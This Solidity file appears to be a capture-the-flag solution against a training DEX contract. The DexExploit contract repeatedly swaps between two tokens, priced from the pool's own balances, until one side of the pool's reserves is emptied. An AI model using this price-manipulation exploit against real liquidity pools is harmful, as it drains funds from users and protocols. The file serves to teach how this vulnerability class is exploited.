// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Dex.sol";

function playerScript(address instanceAddress) {
    DexExploit exploit = new DexExploit();
    Dex instance = Dex(instanceAddress);
    SwappableToken(instance.token1()).transfer(address(exploit), 10);
    SwappableToken(instance.token2()).transfer(address(exploit), 10);
    exploit.exploit(instanceAddress);
}

contract DexExploit {
    function exploit(address instanceAddress) public {
        Dex instance = Dex(instanceAddress);
        address token1 = instance.token1();
        address token2 = instance.token2();
        instance.approve(instanceAddress, type(uint256).max);

        address tokenA = token1;
        address tokenB = token2;
        while (true) {
            address t = tokenA;
            tokenA = tokenB;
            tokenB = t;
            uint256 instanceTokenABalance =
                SwappableToken(tokenA).balanceOf(instanceAddress);
            uint256 instanceTokenBBalance =
                SwappableToken(tokenB).balanceOf(instanceAddress);
            if (instanceTokenABalance == 0 || instanceTokenBBalance == 0) {
                break;
            }
            uint256 tokenAInput =
                SwappableToken(tokenA).balanceOf(address(this));
            uint256 tokenBOutput =
                instance.getSwapPrice(tokenA, tokenB, tokenAInput);
            if (tokenBOutput > instanceTokenBBalance) {
                tokenAInput = (instanceTokenBBalance * instanceTokenABalance)
                    / instanceTokenBBalance;
            }
            instance.swap(tokenA, tokenB, tokenAInput);
        }
    }
}
